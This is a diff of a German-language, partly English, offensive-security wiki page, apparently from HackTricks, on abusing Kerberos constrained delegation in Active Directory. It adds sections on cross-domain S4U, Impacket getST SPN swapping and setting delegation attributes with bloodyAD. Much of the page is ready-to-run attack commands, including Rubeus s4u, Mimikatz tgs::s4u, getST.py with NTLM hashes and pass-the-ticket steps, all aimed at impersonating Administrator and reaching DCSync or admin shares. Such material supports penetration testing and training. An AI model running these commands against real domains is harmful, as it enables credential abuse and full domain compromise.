@@ -4,18 +4,18 @@
 
 ## Constrained Delegation
 
-Mit dieser Methode kann ein Domänenadministrator einem Computer **erlauben**, einen Benutzer oder Computer **zu impersonieren** gegenüber einem beliebigen **Dienst** einer Maschine.
+Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.
 
-- **Service for User to self (_S4U2self_):** Wenn ein **Dienstkonto** einen _userAccountControl_-Wert hat, der [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) enthält, kann es ein TGS für sich selbst (den Dienst) im Namen eines anderen Benutzers erhalten.
-- **Service for User to Proxy(_S4U2proxy_):** Ein **Dienstkonto** könnte ein TGS im Namen eines Benutzers für den Dienst, der in **msDS-AllowedToDelegateTo** festgelegt ist, erhalten. Dazu benötigt es zunächst ein TGS von diesem Benutzer für sich selbst, kann jedoch S4U2self verwenden, um dieses TGS zu erhalten, bevor es das andere anfordert.
+- **Service for User to self (_S4U2self_):** Wenn ein **service account** einen _userAccountControl_-Wert enthält, der [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) beinhaltet, dann kann er ein TGS für sich selbst (den service) im Auftrag eines beliebigen anderen user erhalten.
+- **Service for User to Proxy(_S4U2proxy_):** Ein **service account** könnte ein TGS im Auftrag eines beliebigen user für den in **msDS-AllowedToDelegateTo** gesetzten service erhalten. Dazu benötigt er zuerst ein TGS von diesem user zu sich selbst, kann aber S4U2self verwenden, um dieses TGS zu erhalten, bevor er das andere anfordert.
 
-**Hinweis**: Wenn ein Benutzer in AD als ‘_Account is sensitive and cannot be delegated_ ’ markiert ist, können Sie **ihn nicht impersonieren**.
+**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
 
-Das bedeutet, dass Sie, wenn Sie **den Hash des Dienstes kompromittieren**, **Benutzer impersonieren** und **Zugriff** in ihrem Namen auf jeden **Dienst** über die angegebenen Maschinen erhalten können (mögliche **privesc**).
+Das bedeutet, dass, wenn du **compromise the hash of the service**, du **impersonate users** kannst und im Auftrag von ihnen **access** auf jeden **service** der angegebenen Maschinen erlangen kannst (möglicher **privesc**).
 
-Darüber hinaus haben Sie **nicht nur Zugriff auf den Dienst, den der Benutzer impersonieren kann, sondern auch auf jeden Dienst**, da der SPN (der angeforderte Dienstname) nicht überprüft wird (in dem Ticket ist dieser Teil nicht verschlüsselt/unterzeichnet). Daher können Sie, wenn Sie Zugriff auf den **CIFS-Dienst** haben, auch Zugriff auf den **HOST-Dienst** erhalten, indem Sie beispielsweise das `/altservice`-Flag in Rubeus verwenden.
+Außerdem wirst du **nicht nur Zugriff auf den service haben, den der user impersonate kann, sondern auch auf jeden beliebigen service**, weil der SPN (der angeforderte service name) nicht überprüft wird (in dem Ticket ist dieser Teil nicht verschlüsselt/signiert). Daher, wenn du Zugriff auf **CIFS service** hast, kannst du auch Zugriff auf **HOST service** erhalten, z.B. mit dem `/altservice` Flag in Rubeus. Dieselbe SPN swapping weakness wird durch **Impacket getST -altservice** und andere tooling ausgenutzt.
 
-Außerdem ist **LDAP-Dienstzugriff auf DC** erforderlich, um einen **DCSync** auszunutzen.
+Außerdem ist **LDAP service access on DC** nötig, um einen **DCSync** auszunutzen.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -29,7 +29,44 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-- Schritt 1: **TGT des erlaubten Dienstes abrufen**
+### Cross-domain constrained delegation Hinweise (2025+)
+
+Seit **Windows Server 2012/2012 R2** unterstützt der KDC **constrained delegation across domains/forests** via S4U2Proxy extensions. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC SIDs hinzu, um eine protocol transition zu signalisieren:
+
+- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wenn sich der Benutzer normal authentifiziert hat.
+- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wenn ein Dienst die Identität mittels protocol transition behauptet hat.
+
+Erwarte `SERVICE_ASSERTED_IDENTITY` im PAC, wenn protocol transition über Domänen verwendet wird; das bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.
+
+### Impacket / Linux-Tools (altservice & full S4U)
+
+Neuere Impacket-Versionen (0.11.x+) stellen dieselbe S4U-Kette und SPN-Swapping wie Rubeus bereit:
+```bash
+# Get TGT for delegating service (hash/aes)
+getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
+
+# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
+getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
+-impersonate Administrator contoso.local/websvc$ \
+-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5
+
+# Inject resulting ccache
+export KRB5CCNAME=Administrator.ccache
+smbclient -k //dc.contoso.local/C$ -c 'dir'
+```
+Wenn Sie es vorziehen, zuerst das Benutzer-ST zu fälschen (z. B. nur Offline-Hash), kombinieren Sie **ticketer.py** mit **getST.py** für S4U2Proxy. Siehe das offene Impacket-Issue #1713 für aktuelle Macken (KRB_AP_ERR_MODIFIED, wenn das gefälschte ST nicht zum SPN-Schlüssel passt).
+
+### Automatisieren der Delegierungs-Einrichtung von low-priv creds
+
+Wenn Sie bereits **GenericAll/WriteDACL** über ein Computer- oder Servicekonto besitzen, können Sie die erforderlichen Attribute remote ohne RSAT mit **bloodyAD** (2024+) setzen:
+```bash
+# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
+KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
+KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
+```
+Damit kannst du einen constrained delegation-Pfad für privesc aufbauen, ohne DA-Berechtigungen, sobald du diese Attribute setzen kannst.
+
+- Schritt 1: **Get TGT of the allowed service**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -49,11 +86,11 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder den **RC4** oder **AES256** zu erhalten, ohne SYSTEM auf dem Computer zu sein, wie den Printer Bug und unbeschränkte Delegation, NTLM-Relay und Missbrauch des Active Directory-Zertifizierungsdienstes.
+> Es gibt **andere Wege, ein TGT-Ticket zu erhalten** oder den **RC4** oder **AES256** ohne SYSTEM auf dem Computer zu sein, wie z. B. den Printer Bug und unconstrain delegation, NTLM relaying und Active Directory Certificate Service abuse
 >
-> **Mit diesem TGT-Ticket (oder dem Hash) können Sie diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**
+> **Wenn du dieses TGT-Ticket (oder dessen Hash) hast, kannst du diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**
 
-- Schritt 2: **Holen Sie sich TGS für den Dienst, der den Benutzer impersoniert**
+- Schritt 2: **TGS für den Dienst erhalten, indem du den Benutzer impersonierst**
 ```bash:Using Rubeus
 # Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -81,6 +118,10 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-[**Weitere Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Mehr Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+
+## Quellen
+- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)
 
 {{#include ../../banners/hacktricks-training.md}}
